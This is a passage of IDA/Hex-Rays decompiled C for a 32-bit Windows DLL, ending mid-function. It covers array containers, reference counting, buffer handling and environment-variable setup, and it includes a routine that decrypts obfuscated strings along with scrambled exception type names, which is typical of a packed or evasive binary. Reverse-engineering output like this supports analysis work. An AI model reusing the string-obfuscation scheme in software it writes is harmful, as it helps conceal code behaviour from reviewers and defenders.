// 10073210: using guessed type int (__thiscall *off_10073210)(void *Block, char);

//----- (1000B442) --------------------------------------------------------
int __thiscall sub_1000B442(_DWORD *this)
{
  return this[1];
}

//----- (1000B446) --------------------------------------------------------
int __thiscall sub_1000B446(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // eax
  int result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1008EB3B);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = *a2;
  ++this[1];
  return result;
}

//----- (1000B4A3) --------------------------------------------------------
int __thiscall sub_1000B4A3(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (1000B4BE) --------------------------------------------------------
int __thiscall sub_1000B4BE(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1008EBAA);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  *(_DWORD *)(this[3] + 4 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1000B50A) --------------------------------------------------------
int __thiscall sub_1000B50A(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1008EBAB);
  return this[3] + 4 * a2;
}

//----- (1000B52B) --------------------------------------------------------
int __thiscall sub_1000B52B(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1008EBBD);
  return this[3] + 4 * a2;
}

//----- (1000B54C) --------------------------------------------------------
void __thiscall sub_1000B54C(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 84))(this, this[1], v2, a2);
    j__free(v2);
  }
}

//----- (1000B571) --------------------------------------------------------
int __thiscall sub_1000B571(void **this)
{
  void *v2; // edx
  int result; // eax

  j__free(this[3]);
  v2 = *this;
  this[2] = (void *)1;
  result = (*((int (__thiscall **)(void **, _DWORD, _DWORD, int))v2 + 21))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1000B595) --------------------------------------------------------
BOOL __thiscall sub_1000B595(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (1000B5A0) --------------------------------------------------------
int __thiscall sub_1000B5A0(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_DWORD *)(this[3] + 4 * i) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (1000B5E2) --------------------------------------------------------
unsigned int __thiscall sub_1000B5E2(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1008EBBE);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 4 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1000B654) --------------------------------------------------------
unsigned int __thiscall sub_1000B654(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (1000B67C) --------------------------------------------------------
unsigned int __stdcall sub_1000B67C(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (1000B68F) --------------------------------------------------------
unsigned int __thiscall sub_1000B68F(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(4 * v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_DWORD *)(this[3] + 4 * v6) = *(_DWORD *)(a3 + 4 * v6);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (1000B6ED) --------------------------------------------------------
void __thiscall sub_1000B6ED(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // ebx
  _DWORD *v7; // edi
  int v8; // ebx
  void *Block; // [esp+8h] [ebp-10h]
  _DWORD *v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  unsigned int v12; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v11 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v11 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void *)this[3];
    Block = v6;
    v12 = 0;
    v7 = operator new(4 * v11);
    v10 = v7;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v8 = (_BYTE *)v6 - (_BYTE *)v7;
      do
      {
        ++v12;
        *v7 = *(_DWORD *)((char *)v7 + v8);
        ++v7;
      }
      while ( v12 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v10;
    j__free(Block);
    this[2] = v11;
  }
}

//----- (1000B7B7) --------------------------------------------------------
_DWORD *__userpurge sub_1000B7B7@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (1000B7F6) --------------------------------------------------------
void __thiscall sub_1000B7F6(void *this)
{
  sub_1000B92A((int)this);
}

//----- (1000B83B) --------------------------------------------------------
_DWORD *__userpurge sub_1000B83B@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (1000B87A) --------------------------------------------------------
void __thiscall sub_1000B87A(void *this)
{
  sub_1000B964((int)this);
}

//----- (1000B8AB) --------------------------------------------------------
void *__thiscall sub_1000B8AB(void *Block, char a2)
{
  sub_1000B3F3((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000B8CA) --------------------------------------------------------
_DWORD *__stdcall sub_1000B8CA(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_1007326C;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 1007326C: using guessed type int (__thiscall *off_1007326C)(void *Block, char);

//----- (1000B8F5) --------------------------------------------------------
void *__usercall sub_1000B8F5@<eax>(_DWORD *a1@<esi>)
{
  void *result; // eax

  a1[1] = 0;
  a1[2] = 16;
  result = operator new(0x40u);
  a1[3] = result;
  return result;
}

//----- (1000B92A) --------------------------------------------------------
void __usercall sub_1000B92A(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000B964) --------------------------------------------------------
void __usercall sub_1000B964(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000B9A0) --------------------------------------------------------
_DWORD *__stdcall sub_1000B9A0(_DWORD *a1, wchar_t *Source)
{
  sub_10009D2C(a1, Source);
  *a1 = off_10073324;
  return a1;
}
// 10073324: using guessed type int (__thiscall *off_10073324[2])(void *Block, char);

//----- (1000B9D0) --------------------------------------------------------
int *__thiscall sub_1000B9D0(int *Block, char a2)
{
  sub_1000BA51(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000B9EF) --------------------------------------------------------
_DWORD *__stdcall sub_1000B9EF(_DWORD *a1)
{
  sub_10009D9C(261, a1);
  *a1 = off_10073324;
  return a1;
}
// 10073324: using guessed type int (__thiscall *off_10073324[2])(void *Block, char);

//----- (1000BA21) --------------------------------------------------------
_DWORD *__stdcall sub_1000BA21(_DWORD *a1, int a2)
{
  sub_10009F32(a1, a2);
  *a1 = off_10073324;
  return a1;
}
// 10073324: using guessed type int (__thiscall *off_10073324[2])(void *Block, char);

//----- (1000BA51) --------------------------------------------------------
void __thiscall sub_1000BA51(int *this)
{
  *this = (int)off_10073324;
  sub_10009F65(this);
}
// 10073324: using guessed type int (__thiscall *off_10073324[2])(void *Block, char);

//----- (1000BA75) --------------------------------------------------------
_DWORD *__stdcall sub_1000BA75(_DWORD *a1, int a2, int a3)
{
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-18h] BYREF

  *a1 = &off_10073328;
  sub_10009F32(a1 + 1, a2);
  pExceptionObject[5] = 0;
  if ( !SetEnvironmentVariableW(*(LPCWSTR *)(a1[2] + 12), *(LPCWSTR *)(*(_DWORD *)(a3 + 4) + 12)) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return a1;
}
// 10073328: using guessed type int (__thiscall *off_10073328)(void *Block, char);

//----- (1000BADB) --------------------------------------------------------
void __thiscall sub_1000BADB(int *this)
{
  *this = (int)&off_10073328;
  SetEnvironmentVariableW(*(LPCWSTR *)(this[2] + 12), 0);
  sub_10009F65(this + 1);
}
// 10073328: using guessed type int (__thiscall *off_10073328)(void *Block, char);

//----- (1000BB2D) --------------------------------------------------------
int *__thiscall sub_1000BB2D(int *Block, char a2)
{
  sub_1000BADB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000BB4C) --------------------------------------------------------
int __usercall sub_1000BB4C@<eax>(int a1@<ebx>)
{
  wchar_t *v1; // eax
  int v2; // eax
  wchar_t *v3; // eax
  int v4; // eax
  wchar_t *v5; // eax
  int v6; // eax
  wchar_t *v7; // eax
  int v8; // eax
  int *v9; // eax
  int v11; // [esp+Ch] [ebp-50h] BYREF
  int v12; // [esp+10h] [ebp-4Ch] BYREF
  int v13[2]; // [esp+14h] [ebp-48h] BYREF
  int v14[3]; // [esp+1Ch] [ebp-40h] BYREF
  int v15[3]; // [esp+28h] [ebp-34h] BYREF
  int v16[3]; // [esp+34h] [ebp-28h] BYREF
  int v17[4]; // [esp+40h] [ebp-1Ch] BYREF
  int v18; // [esp+58h] [ebp-4h]

  if ( *(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) )
  {
    v1 = (wchar_t *)sub_1000BE16((int)&unk_1008F7BC);
    sub_10009D2C(&v11, v1);
    v18 = 0;
    sub_10020E83(v13);
    LOBYTE(v18) = 1;
    sub_1000BA75(v17, (int)&v11, v2);
    LOBYTE(v18) = 3;
    sub_10009F65(v13);
    LOBYTE(v18) = 4;
    sub_10009F65(&v11);
    v3 = (wchar_t *)sub_1000BE16((int)&unk_1008F7F4);
    sub_10009D2C(&v11, v3);
    LOBYTE(v18) = 5;
    sub_10020D40(v13);
    LOBYTE(v18) = 6;
    sub_1000BA75(v16, (int)&v11, v4);
    LOBYTE(v18) = 8;
    sub_10009F65(v13);
    LOBYTE(v18) = 9;
    sub_10009F65(&v11);
    v5 = (wchar_t *)sub_1000BE16((int)&unk_1008F834);
    sub_10009D2C(&v11, v5);
    LOBYTE(v18) = 10;
    sub_10020F1A(v13);
    LOBYTE(v18) = 11;
    sub_1000BA75(v15, (int)&v11, v6);
    LOBYTE(v18) = 13;
    sub_10009F65(v13);
    LOBYTE(v18) = 14;
    sub_10009F65(&v11);
    v7 = (wchar_t *)sub_1000BE16((int)&unk_1008F870);
    sub_10009D2C(&v11, v7);
    LOBYTE(v18) = 15;
    sub_10020FB1(v13);
    LOBYTE(v18) = 16;
    sub_1000BA75(v14, (int)&v11, v8);
    LOBYTE(v18) = 18;
    sub_10009F65(v13);
    LOBYTE(v18) = 19;
    sub_10009F65(&v11);
    v9 = sub_10020C0F(v13, a1);
    LOBYTE(v18) = 20;
    sub_1000BA21(&v11, (int)v9);
    LOBYTE(v18) = 21;
    sub_100021B1(&v12, (int *)(a1 + 4));
    LOBYTE(v18) = 20;
    sub_1000BA51(&v11);
    LOBYTE(v18) = 19;
    sub_10009F65(v13);
    LOBYTE(v18) = 14;
    sub_1000BADB(v14);
    LOBYTE(v18) = 9;
    sub_1000BADB(v15);
    LOBYTE(v18) = 4;
    sub_1000BADB(v16);
    v18 = -1;
    sub_1000BADB(v17);
  }
  return a1;
}
// 1000BBBB: variable 'v2' is possibly undefined
// 1000BC0E: variable 'v4' is possibly undefined
// 1000BC61: variable 'v6' is possibly undefined
// 1000BCB4: variable 'v8' is possibly undefined
// 1000BB4C: using guessed type int var_1C[4];
// 1000BB4C: using guessed type int var_28[3];
// 1000BB4C: using guessed type int var_34[3];
// 1000BB4C: using guessed type int var_40[3];

//----- (1000BD68) --------------------------------------------------------
unsigned int __usercall sub_1000BD68@<eax>(int a1@<eax>)
{
  return ((a1 + 5) * (a1 + 26)) ^ ((unsigned int)((a1 + 5) * (a1 + 26)) >> 8) ^ ((((a1 + 5) * (a1 + 26)) ^ ((unsigned int)((a1 + 5) * (a1 + 26)) >> 8)) >> 16);
}

//----- (1000BDA7) --------------------------------------------------------
void __cdecl sub_1000BDA7(int a1, unsigned int a2)
{
  unsigned int i; // edi

  for ( i = 0; i < a2; ++i )
    *(_BYTE *)(i + a1) -= sub_1000BD68(i);
}

//----- (1000BDCC) --------------------------------------------------------
int __cdecl sub_1000BDCC(int a1)
{
  int result; // eax
  unsigned int v3; // [esp-4h] [ebp-10h]
  int v4; // [esp+14h] [ebp+8h]

  if ( !*(_BYTE *)(a1 + 8) )
    return a1 + 11;
  v3 = *(unsigned __int16 *)(a1 + 9);
  v4 = a1 + 11;
  sub_1000BDA7(v4, v3);
  result = v4;
  *(_BYTE *)(a1 + 8) = 0;
  return result;
}

//----- (1000BE16) --------------------------------------------------------
int __cdecl sub_1000BE16(int a1)
{
  if ( *(_WORD *)(a1 + 16) )
  {
    sub_1000BDA7(a1 + 20, *(unsigned __int16 *)(a1 + 18));
    *(_WORD *)(a1 + 16) = 0;
  }
  return a1 + 20;
}

//----- (1000BE8E) --------------------------------------------------------
LONG __usercall sub_1000BE8E@<eax>(int a1@<esi>)
{
  LONG result; // eax

  result = InterlockedDecrement((volatile LONG *)(a1 + 4));
  if ( !result )
  {
    if ( a1 )
      return (**(int (__thiscall ***)(int, int))a1)(a1, 1);
  }
  return result;
}

//----- (1000BEC2) --------------------------------------------------------
_DWORD *__stdcall sub_1000BEC2(_DWORD *a1, int a2)
{
  *a1 = off_10073330;
  a1[1] = a2;
  sub_1000C043(a1 + 2);
  sub_1000C093(a1 + 4);
  a1[6] = 0;
  a1[7] = 0;
  sub_1000E44D((int)(a1 + 8));
  sub_1000E349((int)(a1 + 10));
  return a1;
}
// 10073330: using guessed type int (__cdecl *off_10073330[2])(int, int);

//----- (1000BF21) --------------------------------------------------------
int __thiscall sub_1000BF21(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v2 = (***(int (__thiscall ****)(_DWORD))(this + 4))(*(_DWORD *)(this + 4));
  if ( v2 != *(_DWORD *)(this + 24) )
  {
    *(_DWORD *)(this + 24) = v2;
    v3 = operator new(0x28u);
    if ( v3 )
      v4 = sub_10021188(v3, *(_DWORD *)(this + 24), this + 40);
    else
      v4 = 0;
    sub_1000C0E3((_DWORD *)(this + 8), (int)v4);
  }
  return *(_DWORD *)(this + 8);
}

//----- (1000BF79) --------------------------------------------------------
int __thiscall sub_1000BF79(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 != *(_DWORD *)(this + 28) )
  {
    *(_DWORD *)(this + 28) = v2;
    v3 = operator new(0x3Cu);
    if ( v3 )
      v4 = sub_1002134B(v3, *(_DWORD *)(this + 28), this + 32);
    else
      v4 = 0;
    sub_1000C126((_DWORD *)(this + 16), (int)v4);
  }
  return *(_DWORD *)(this + 16);
}

//----- (1000BFEA) --------------------------------------------------------
int __thiscall sub_1000BFEA(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 20))(this[1]);
}

//----- (1000BFF6) --------------------------------------------------------
int __thiscall sub_1000BFF6(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 24))(this[1]);
}

//----- (1000BFFE) --------------------------------------------------------
int __thiscall sub_1000BFFE(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 28))(this[1]);
}

//----- (1000C00A) --------------------------------------------------------
int __thiscall sub_1000C00A(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 32))(this[1]);
}

//----- (1000C012) --------------------------------------------------------
void *__thiscall sub_1000C012(_DWORD **this, void *a2)
{
  (*(void (__thiscall **)(_DWORD *, void *))(*this[1] + 36))(this[1], a2);
  return a2;
}

//----- (1000C043) --------------------------------------------------------
_DWORD *__usercall sub_1000C043@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}

//----- (1000C093) --------------------------------------------------------
_DWORD *__usercall sub_1000C093@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}

//----- (1000C0E3) --------------------------------------------------------
void __usercall sub_1000C0E3(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10002C33((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}

//----- (1000C126) --------------------------------------------------------
void __usercall sub_1000C126(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10002C5B((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}

//----- (1000C169) --------------------------------------------------------
int __stdcall sub_1000C169(int a1, void *a2, void *a3)
{
  *(_DWORD *)a1 = &off_1007332C;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = &off_1007335C;
  sub_1000C25C(a2, a1, a3);
  return a1;
}
// 1007332C: using guessed type void (__noreturn *off_1007332C)();
// 1007335C: using guessed type int (__thiscall *off_1007335C)(void *Block, char);

//----- (1000C1A9) --------------------------------------------------------
void *__thiscall sub_1000C1A9(void *Block, char a2)
{
  sub_1000C20C((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000C1C9) --------------------------------------------------------
int __stdcall sub_1000C1C9(int a1, int a2)
{
  *(_DWORD *)a1 = &off_1007332C;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = &off_1007335C;
  sub_1000C25C(*(void **)(a2 + 16), a1, *(void **)(a2 + 12));
  return a1;
}
// 1007332C: using guessed type void (__noreturn *off_1007332C)();
// 1007335C: using guessed type int (__thiscall *off_1007335C)(void *Block, char);

//----- (1000C20C) --------------------------------------------------------
void __stdcall sub_1000C20C(int a1)
{
  *(_DWORD *)a1 = &off_1007335C;
  if ( *(_DWORD *)(a1 + 12) )
    j__free(*(void **)(a1 + 12));
  *(_DWORD *)a1 = &off_1007332C;
}
// 1007332C: using guessed type void (__noreturn *off_1007332C)();
// 1007335C: using guessed type int (__thiscall *off_1007335C)(void *Block, char);

//----- (1000C25C) --------------------------------------------------------
void *__userpurge sub_1000C25C@<eax>(void *result@<eax>, int a2@<esi>, void *Src)
{
  *(_DWORD *)(a2 + 12) = 0;
  *(_DWORD *)(a2 + 16) = result;
  if ( result )
  {
    result = operator new((size_t)result);
    *(_DWORD *)(a2 + 12) = result;
    if ( Src )
      return memcpy(result, Src, *(_DWORD *)(a2 + 16));
  }
  return result;
}

//----- (1000C28D) --------------------------------------------------------
int __userpurge sub_1000C28D@<eax>(void *a1@<ebx>, int a2, void *a3)
{
  void *v3; // eax
  int v4; // eax

  *(_DWORD *)a2 = off_10073358;
  v3 = operator new(0x14u);
  if ( v3 )
    v4 = sub_1000C169((int)v3, a1, a3);
  else
    v4 = 0;
  *(_DWORD *)(a2 + 4) = v4;
  sub_1000C8D4((int *)(a2 + 4), 0);
  *(_DWORD *)(a2 + 8) = 0;
  *(_DWORD *)(a2 + 12) = a1;
  *(_BYTE *)(a2 + 16) = 0;
  return a2;
}
// 10073358: using guessed type int (__thiscall *off_10073358[2])(void *Block, char);

//----- (1000C2F3) --------------------------------------------------------
int *__thiscall sub_1000C2F3(int *Block, char a2)
{
  sub_1000C45D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000C312) --------------------------------------------------------
int __userpurge sub_1000C312@<eax>(int a1@<ebx>, int a2)
{
  int v2; // eax
  size_t v3; // eax
  void *v5; // [esp-4h] [ebp-24h]
  void *Block; // [esp+10h] [ebp-10h]

  *(_DWORD *)a2 = off_10073358;
  Block = operator new(0x14u);
  v2 = 0;
  if ( Block )
  {
    v5 = *(void **)(*(_DWORD *)(a1 + 4) + 12);
    v3 = sub_1000A1F9(a1);
    v2 = sub_1000C169((int)Block, (void *)(2 * v3), v5);
  }
  *(_DWORD *)(a2 + 4) = v2;
  sub_1000C8D4((int *)(a2 + 4), 0);
  *(_DWORD *)(a2 + 8) = 0;
  *(_DWORD *)(a2 + 12) = 2 * sub_1000A1F9(a1);
  *(_BYTE *)(a2 + 16) = 0;
  return a2;
}
// 10073358: using guessed type int (__thiscall *off_10073358[2])(void *Block, char);

//----- (1000C38D) --------------------------------------------------------
int __userpurge sub_1000C38D@<eax>(int a1@<ebx>, int *a2@<edi>, int a3, int a4, void *pExceptionObject)
{
  char v5; // cl
  void *v7; // [esp-4h] [ebp-20h]

  v7 = pExceptionObject;
  *(_DWORD *)a3 = off_10073358;
  sub_1000C84C(a2 + 1, (int *)(a3 + 4), v7);
  *(_DWORD *)(a3 + 8) = a4 + a2[2];
  v5 = (char)pExceptionObject;
  *(_DWORD *)(a3 + 12) = a1;
  *(_BYTE *)(a3 + 16) = v5;
  if ( a1 + a4 > (unsigned int)a2[3] )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return a3;
}
// 10073358: using guessed type int (__thiscall *off_10073358[2])(void *Block, char);

//----- (1000C3F3) --------------------------------------------------------
int __userpurge sub_1000C3F3@<eax>(_DWORD *a1@<ebx>, int a2)
{
  *(_DWORD *)a2 = off_10073358;
  *(_DWORD *)(a2 + 4) = a1[1];
  sub_1000C8D4((int *)(a2 + 4), 0);
  *(_DWORD *)(a2 + 8) = a1[2];
  *(_DWORD *)(a2 + 12) = a1[3];
  *(_BYTE *)(a2 + 16) = 0;
  return a2;
}
// 10073358: using guessed type int (__thiscall *off_10073358[2])(void *Block, char);

//----- (1000C439) --------------------------------------------------------
int __usercall sub_1000C439@<eax>(int *a1@<ebx>, int a2@<esi>)
{
  if ( a1 != (int *)a2 )
  {
    sub_1000C8A9(a1 + 1, (int *)(a2 + 4));
    *(_DWORD *)(a2 + 8) = a1[2];
    *(_DWORD *)(a2 + 12) = a1[3];
    *(_BYTE *)(a2 + 16) = 0;
  }
  return a2;
}

//----- (1000C45D) --------------------------------------------------------
LONG __thiscall sub_1000C45D(int *this)
{
  *this = (int)off_10073358;
  return sub_1000C875(this + 1);
}
// 10073358: using guessed type int (__thiscall *off_10073358[2])(void *Block, char);

//----- (1000C485) --------------------------------------------------------
void __usercall sub_1000C485(int a1@<ebx>)
{
  int *v1; // edi
  void *v2; // eax
  void *Block[3]; // [esp+10h] [ebp-10h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  if ( !*(_BYTE *)(a1 + 16) )
  {
    v1 = (int *)(a1 + 4);
    if ( *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4) > 1u )
    {
      Block[0] = operator new(0x14u);
      v4 = 0;
      if ( Block[0] )
        v2 = (void *)sub_1000C169(
                       (int)Block[0],
                       *(void **)(a1 + 12),
                       (void *)(*(_DWORD *)(a1 + 8) + *(_DWORD *)(*v1 + 12)));
      else
        v2 = 0;
      v4 = -1;
      Block[0] = v2;
      sub_1000C8D4((int *)Block, 0);
      v4 = 1;
      sub_1000C8A9((int *)Block, v1);
      v4 = -1;
      sub_1000C875((int *)Block);
      *(_DWORD *)(a1 + 8) = 0;
    }
    *(_BYTE *)(*v1 + 8) = 0;
  }
}

//----- (1000C50A) --------------------------------------------------------
int __usercall sub_1000C50A@<eax>(_DWORD *a1@<eax>)
{
  if ( !a1[3] )
    return 0;
  sub_1000C485((int)a1);
  return a1[2] + *(_DWORD *)(a1[1] + 12);
}

//----- (1000C52E) --------------------------------------------------------
int __thiscall sub_1000C52E(_DWORD *this)
{
  if ( this[3] )
    return this[2] + *(_DWORD *)(this[1] + 12);
  else
    return 0;
}

//----- (1000C55B) --------------------------------------------------------
int __userpurge sub_1000C55B@<eax>(int a1@<eax>, int a2)
{
  sub_1000C485(a1);
  return a2 + *(_DWORD *)(a1 + 8) + *(_DWORD *)(*(_DWORD *)(a1 + 4) + 12);
}

//----- (1000C577) --------------------------------------------------------
bool __fastcall sub_1000C577(_DWORD *a1, _DWORD *a2)
{
  size_t v2; // eax
  int v4; // eax
  int v5; // esi
  int v6; // ecx
  int v7; // edx
  size_t Size; // [esp+0h] [ebp-4h]

  v2 = a2[3];
  Size = v2;
  if ( v2 != a1[3] )
    return 0;
  if ( !v2 )
    return 1;
  v4 = a1[1];
  v5 = a1[2];
  v6 = a2[1];
  v7 = a2[2];
  return v7 + *(_DWORD *)(v6 + 12) == v5 + *(_DWORD *)(v4 + 12)
      || memcmp((const void *)(v7 + *(_DWORD *)(v6 + 12)), (const void *)(v5 + *(_DWORD *)(v4 + 12)), Size) == 0;
}

//----- (1000C5DF) --------------------------------------------------------
int __thiscall sub_1000C5DF(_DWORD *this, int a2)
{
  void *v3; // ebx
  void *v4; // eax
  void *v5; // ebx
  void *v6; // eax
  void *v7; // eax
  void *v8; // eax
  const void *v9; // eax
  int v10; // edx
  int v11; // edi
  const void *v12; // eax
  size_t v14; // [esp-4h] [ebp-4Ch]
  size_t v15; // [esp-4h] [ebp-4Ch]
  int v16[5]; // [esp+10h] [ebp-38h] BYREF
  int v17[3]; // [esp+24h] [ebp-24h] BYREF
  size_t Size; // [esp+30h] [ebp-18h]
